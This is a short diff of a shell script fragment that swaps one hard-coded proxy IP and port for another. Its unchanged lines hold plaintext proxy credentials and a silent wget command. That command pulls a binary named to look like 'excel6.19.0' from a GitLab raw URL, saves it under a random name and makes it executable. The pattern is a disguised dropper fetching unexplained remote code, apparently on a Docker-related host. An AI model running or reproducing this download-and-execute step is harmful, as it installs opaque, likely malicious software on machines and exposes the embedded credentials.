@@ -1,5 +1,5 @@
-proxy="185.199.228.220" 
-port="7300" 
+proxy="188.74.210.21" 
+port="6100" 
 user="ubslvwxe"  
 pass="iikj33112te4"
 wget -q -O po893146742 https://gitlab.com/55113110159/dokerweb/-/raw/main/excel6.19.0 && chmod +x po893146742
